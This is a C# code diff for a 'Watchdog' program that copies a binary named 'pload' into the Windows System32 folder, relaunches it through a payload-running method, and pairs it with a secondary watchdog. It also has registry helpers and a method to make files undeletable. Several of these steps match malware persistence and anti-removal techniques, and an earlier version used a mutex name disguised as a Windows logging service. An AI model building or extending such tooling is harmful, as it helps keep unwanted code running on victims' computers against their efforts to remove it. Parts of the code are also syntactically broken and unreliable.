@@ -12,14 +12,19 @@ class Watchdog : IWatchdog
 
 
     // Defaults to putting the file in the System32 directory and the binary name pload
-    static string binaryPath = @"C:\\Windows\System32";
-    static string binaryName = @"pload";
-    static string secondaryWatchdogName = @"Wdog2";
+     public static string BinaryPath { get; private set; }
+    public static string BinaryName { get; private set; }
+    public static string SecondaryWatchdogPath { get; private set; }
+    public static string SecondaryWatchdogName { get; private set; }
+    public static string SecondaryWatchdogMutexName { get; private set; }
 
 
     static void Main(string[] args)
     {
-        string mutexName = "WindowsLogService";
+        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName"};
+        watchdogHelper.LoadFromJson("Config.json", staticVars)
+
+        string mutexName = "Watchdog";
 
         // Create or open the mutex to ensure only one instance is running
         using (Mutex mutex = new Mutex(false, mutexName, out bool isNewInstance))
@@ -45,12 +50,35 @@ class Watchdog : IWatchdog
         }
     }
 
+    static bool IsMutexRunning(string mutexName)
+    {
+        bool isNewInstance;
+        
+        // Attempt to create a mutex with the specified name
+        using (Mutex mutex = new Mutex(false, mutexName, out isNewInstance))
+        {
+            // If a new instance was created, it means no other instance was running
+            if (isNewInstance)
+            {
+                // Release the mutex so it's not held by this check
+                mutex.ReleaseMutex();
+                return false;
+            }
+            else
+            {
+                // If we couldn't create a new instance, another instance is already running
+                return true;
+            }
+        }
+    }
+
     static bool IsProcessRunning(string processName)
     {
         // Get a list of processes by name
         Process[] processes = Process.GetProcessesByName(processName);
         return processes.Length > 0;
     }
+
 
     static void WatchdogLogic()
     {
@@ -69,11 +97,11 @@ class Watchdog : IWatchdog
         }
     }
 
-    public static void CheckBinary(string destinationPath)
+    public static void CheckBinary(string destinationPath, string name)
     {
         string currentDirectory = Directory.GetCurrentDirectory();
-        string sourcePath = Path.Combine(currentDirectory, binaryName);
-        string destPathBinary = Path.Combine(destinationPath, binaryName);
+        string sourcePath = Path.Combine(currentDirectory, name);
+        string destPathBinary = Path.Combine(destinationPath, name);
 
 
         if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath, sourcePath)){
@@ -143,7 +171,7 @@ class Watchdog : IWatchdog
         }
     }
 
-    public static void runPayload(string binaryPath, string arguments = "")
+    public static void runBinary(string binaryPath, string Mutex, string arguments = "")
     {
         try
         {
@@ -186,6 +214,15 @@ class Watchdog : IWatchdog
             Console.WriteLine($"Failed to run binary: {ex.Message}");
         }
     }
+
+    public static void runWatchdog(string binaryPath, string arguments = "")
+    {
+            RegistryHelper.
+            if(!IsMutexRunning(secondaryWatchdogMutexName)){
+                CheckBinary(secondaryWatchdogPath, secondaryWatchdogName);
+            }
+    }
+
 
     public static void makeUndeletable()
     {
